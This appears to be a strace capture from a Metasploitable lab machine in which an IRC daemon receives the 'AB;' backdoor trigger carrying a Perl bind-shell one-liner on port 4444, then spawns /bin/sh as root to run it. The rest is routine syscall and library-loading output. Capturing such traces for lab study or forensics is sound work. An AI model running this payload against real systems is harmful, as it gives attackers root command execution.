4519  07:23:22.595323 select(1024, [2 3 4 7 9], [], NULL, {0, 700000}) = 1 (in [2], left {0, 520000})
4519  07:23:22.774981 clock_gettime(CLOCK_MONOTONIC, {1812, 592006493}) = 0
4519  07:23:22.775009 time(NULL)        = 1495625002
4519  07:23:22.775025 time(NULL)        = 1495625002
4519  07:23:22.775042 gettimeofday({1495625002, 775049}, NULL) = 0
4519  07:23:22.775060 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  07:23:22.775157 clock_gettime(CLOCK_MONOTONIC, {1812, 592173652}) = 0
4519  07:23:22.775174 gettimeofday({1495625002, 775196}, NULL) = 0
4519  07:23:22.775206 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:23:22.775269 clock_gettime(CLOCK_MONOTONIC, {1812, 592283658}) = 0
4519  07:23:22.775285 accept(2, 0, NULL) = 5
4519  07:23:22.775373 getpeername(5, {sa_family=AF_INET, sin_port=htons(44817), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:23:22.775419 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:23:22.775437 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:23:22.775456 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:23:22.775473 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:23:22.775489 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:23:22.775506 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:23:22.775526 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:23:22.775548 clock_gettime(CLOCK_MONOTONIC, {1812, 592564471}) = 0
4519  07:23:22.775566 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:23:22.775582 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:23:22.775596 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:23:22.775709 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:23:22.775726 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:23:22.775750 send(6, "z\336\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:23:22.775820 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:23:22.775850 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n", 70, 0) = 70
4519  07:23:22.775934 gettimeofday({1495625002, 775954}, NULL) = 0
4519  07:23:22.775965 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:23:22.778390 clock_gettime(CLOCK_MONOTONIC, {1812, 595421757}) = 0
4519  07:23:22.778422 recvfrom(6, "z\336\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\1\n\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:23:22.778477 close(6)          = 0
4519  07:23:22.778493 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:23:22.778507 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 104, 0) = 104
4519  07:23:22.778576 time(NULL)        = 1495625002
4519  07:23:22.778631 time(NULL)        = 1495625002
4519  07:23:22.778645 gettimeofday({1495625002, 778649}, NULL) = 0
4519  07:23:22.778658 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:23:22.778701 clock_gettime(CLOCK_MONOTONIC, {1812, 595714074}) = 0
4519  07:23:22.778711 gettimeofday({1495625002, 778715}, NULL) = 0
4519  07:23:22.778722 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:23:22.778761 clock_gettime(CLOCK_MONOTONIC, {1812, 595774030}) = 0
4519  07:23:22.778773 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:23:22.778801 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:23:22.778821 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:23:22.778833 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:23:22.778857 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 8421
8421  07:23:22.778933 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
8421  07:23:22.778948 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
8421  07:23:22.778959 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8421  07:23:22.778973 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
8421  07:23:22.779079 brk(0)            = 0x80f9000
8421  07:23:22.779090 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8421  07:23:22.779091 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f84000
8421  07:23:22.779091 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
8421  07:23:22.779100 open("/etc/ld.so.cache", O_RDONLY) = 1
8421  07:23:22.779114 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8421  07:23:22.779133 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f7c000
8421  07:23:22.779143 close(1)          = 0
8421  07:23:22.779154 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8421  07:23:22.779170 open("/lib/libncurses.so.5", O_RDONLY) = 1
8421  07:23:22.779183 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
8421  07:23:22.779279 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
8421  07:23:22.779297 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f4c000
8421  07:23:22.779309 mmap2(0xb7f79000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f79000
8421  07:23:22.779327 close(1)          = 0
8421  07:23:22.779339 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8421  07:23:22.779353 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
8421  07:23:22.779367 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
8421  07:23:22.779515 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
8421  07:23:22.779534 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f48000
8421  07:23:22.779546 mmap2(0xb7f4a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f4a000
8421  07:23:22.779563 close(1)          = 0
8421  07:23:22.779574 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8421  07:23:22.779589 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
8421  07:23:22.779602 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
8421  07:23:22.779692 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
8421  07:23:22.779709 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f47000
8421  07:23:22.779723 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7df8000
8421  07:23:22.779734 mmap2(0xb7f41000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f41000
8421  07:23:22.779748 mmap2(0xb7f44000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f44000
8421  07:23:22.779763 close(1)          = 0
8421  07:23:22.779786 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7df7000
8421  07:23:22.779798 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7df76b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
8421  07:23:22.779855 mprotect(0xb7f41000, 4096, PROT_READ) = 0
8421  07:23:22.779894 munmap(0xb7f7c000, 29913) = 0
8421  07:23:22.779951 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8421  07:23:22.779981 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
8421  07:23:22.780001 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc9a660) = -1 ENOTTY (Inappropriate ioctl for device)
8421  07:23:22.780032 brk(0)            = 0x80f9000
8421  07:23:22.780041 brk(0x80fa000)    = 0x80fa000
8421  07:23:22.780053 brk(0x80fb000)    = 0x80fb000
8421  07:23:22.780070 getuid32()        = 0
8421  07:23:22.780080 getgid32()        = 0
8421  07:23:22.780089 geteuid32()       = 0
8421  07:23:22.780098 getegid32()       = 0
8421  07:23:22.780112 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8421  07:23:22.780126 time(NULL)        = 1495625002
8421  07:23:22.780138 brk(0x80fc000)    = 0x80fc000
8421  07:23:22.780153 brk(0x80fd000)    = 0x80fd000
8421  07:23:22.780173 open("/proc/meminfo", O_RDONLY) = 1
8421  07:23:22.780195 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
8421  07:23:22.780213 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f83000
8421  07:23:22.780225 read(1, "MemTotal:      1035240 kB\nMemFree:        513236 kB\nBuffers:         66420 kB\nCached:         297988 kB\nSwapCached:          0 kB\nActive:         254956 kB\nInactive:       238376 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        512996 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4888 kB\nWriteback:           0 kB\nAnonPages:      128976 kB\nMapped:          52004 kB\nSlab:            17364 kB\nSReclaimable:     9072 kB\nSUnreclaim:       8292 kB\nPageTables:       1976 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
8421  07:23:22.780314 close(1)          = 0
8421  07:23:22.780325 munmap(0xb7f83000, 4096) = 0
8421  07:23:22.780337 brk(0x80fe000)    = 0x80fe000
8421  07:23:22.780363 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
8421  07:23:22.780376 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
8421  07:23:22.780389 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8421  07:23:22.780401 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8421  07:23:22.780444 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
8421  07:23:22.780474 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
8421  07:23:22.780488 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8421  07:23:22.780499 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8421  07:23:22.780513 uname({sys="Linux", node="metasploitable", ...}) = 0
8421  07:23:22.780561 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8421  07:23:22.780579 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8421  07:23:22.780598 brk(0x8100000)    = 0x8100000
8421  07:23:22.780610 getcwd("/etc/unreal", 4096) = 12
8421  07:23:22.780624 getpid()          = 8421
8421  07:23:22.780641 getppid()         = 4519
8421  07:23:22.780657 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8421  07:23:22.780677 stat64("/sbin/sh", 0xbfc9a638) = -1 ENOENT (No such file or directory)
8421  07:23:22.780690 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
8421  07:23:22.780708 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
8421  07:23:22.780732 socket(PF_FILE, SOCK_STREAM, 0) = 1
8421  07:23:22.780745 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
8421  07:23:22.780757 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
8421  07:23:22.780779 close(1)          = 0
8421  07:23:22.780790 socket(PF_FILE, SOCK_STREAM, 0) = 1
8421  07:23:22.780800 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
8421  07:23:22.780810 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
8421  07:23:22.780829 close(1)          = 0
8421  07:23:22.780842 open("/etc/nsswitch.conf", O_RDONLY) = 1
8421  07:23:22.780856 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
8421  07:23:22.780873 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f83000
8421  07:23:22.780884 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
8421  07:23:22.780904 read(1, "", 4096) = 0
8421  07:23:22.780904 close(1)          = 0
8421  07:23:22.780905 munmap(0xb7f83000, 4096) = 0
8421  07:23:22.780905 open("/etc/ld.so.cache", O_RDONLY) = 1
8421  07:23:22.780905 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8421  07:23:22.780905 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f7c000
8421  07:23:22.780905 close(1)          = 0
8421  07:23:22.780906 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8421  07:23:22.780906 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
8421  07:23:22.780906 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
8421  07:23:22.780985 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
8421  07:23:22.781003 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dee000
8421  07:23:22.781015 mmap2(0xb7df5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7df5000
8421  07:23:22.781032 close(1)          = 0
8421  07:23:22.781044 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8421  07:23:22.781058 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
8421  07:23:22.781071 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
8421  07:23:22.781257 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
8421  07:23:22.781283 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dd6000
8421  07:23:22.781299 mmap2(0xb7dea000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7dea000
8421  07:23:22.781319 mmap2(0xb7dec000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dec000
8421  07:23:22.781338 close(1)          = 0
8421  07:23:22.781373 munmap(0xb7f7c000, 29913) = 0
8421  07:23:22.781396 open("/etc/ld.so.cache", O_RDONLY) = 1
8421  07:23:22.781414 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8421  07:23:22.781437 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f7c000
8421  07:23:22.781451 close(1)          = 0
8421  07:23:22.781465 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8421  07:23:22.781485 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
8421  07:23:22.781505 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
